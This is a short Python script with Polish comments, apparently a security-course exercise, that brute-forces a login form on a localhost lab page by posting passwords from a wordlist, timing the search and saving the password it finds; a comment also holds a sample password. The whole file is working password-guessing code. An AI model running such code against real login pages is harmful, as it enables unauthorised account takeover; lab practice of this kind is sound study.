import requests
import time

def brute_force_attack(url, username, password_file):
    start_time = time.time()  # Początkowy czas

    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            payload = {'username': username, 'password': password}
            try:
                response = requests.post(url, data=payload)
                if "http://localhost/bezp/zad5/welcome.php" in response.url:
                    end_time = time.time()  # Końcowy czas
                    search_time = end_time - start_time  # Czas szukania
                    print(f"Znaleziono hasło: {password} :)")
                    print(f"Czas szukania: {search_time} sekundy")
                    with open('found_password.txt', 'w') as f:
                        f.write(password)
                    return password  # Zwracanie hasła
                #else:
                    #print(f"Hasło {password} niepoprawne :(")
            except requests.exceptions.RequestException as e:
                print(f"Błąd połączenia: {e}")

            time.sleep(0.01)  # Czekanie między próbami

    

    return None

# Url strony
login_url = 'http://localhost/bezp/zad5/login.php'

# Login użytkownika
username = 'testuser'
# admin%1986

# Plik z hasłami
password_file = 'password_variations.txt'

# Próba złamania hasła
brute_force_attack(login_url, username, password_file)
